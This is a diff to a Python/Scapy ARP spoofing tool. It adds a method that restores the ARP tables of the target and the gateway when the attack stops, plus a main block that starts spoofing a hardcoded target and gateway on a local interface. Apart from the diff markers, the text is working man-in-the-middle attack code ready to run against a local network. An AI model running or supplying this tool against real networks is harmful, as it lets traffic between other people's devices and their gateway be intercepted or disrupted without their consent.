@@ -38,6 +38,16 @@ class ARPSpoofer:
                                                                    psrc=spoof_ip)
         sendp(packet, iface=self.interface)
 
+    def restore(self, destination_ip, source_ip):
+        '''
+        Restore the ARP tables of the target and gateway
+        '''
+        destination_mac = self.get_mac(destination_ip)
+        source_mac = self.get_mac(source_ip)
+        packet = Ether(dst=destination_mac, src=source_mac) / ARP(op=2, pdst=destination_ip, hwdst=destination_mac,
+                    psrc=source_ip, hwsrc=source_mac)
+        sendp(packet, iface=self.interface, count=4)
+
     def start(self):
         self.spoofing = True
         print(f"[*] Starting ARP spoofing attack...")
@@ -57,3 +67,16 @@ class ARPSpoofer:
     def stop(self):
         print("\n[*] Stopping ARP spoofing attack...")
         self.spoofing = False
+        # Restore ARP tables
+        self.restore(self.target_ip, self.gateway_ip)
+        self.restore(self.gateway_ip, self.target_ip)
+        print("[*] ARP tables restored") 
+
+if __name__ == "__main__":
+    # Example usage
+    interface = "en0"  # Change this to your network interface
+    target_ip = "192.168.0.187"  # Target IP address
+    gateway_ip = "192.168.0.1"  # Gateway IP address
+    
+    spoofer = ARPSpoofer(interface, target_ip, gateway_ip)
+    spoofer.start()
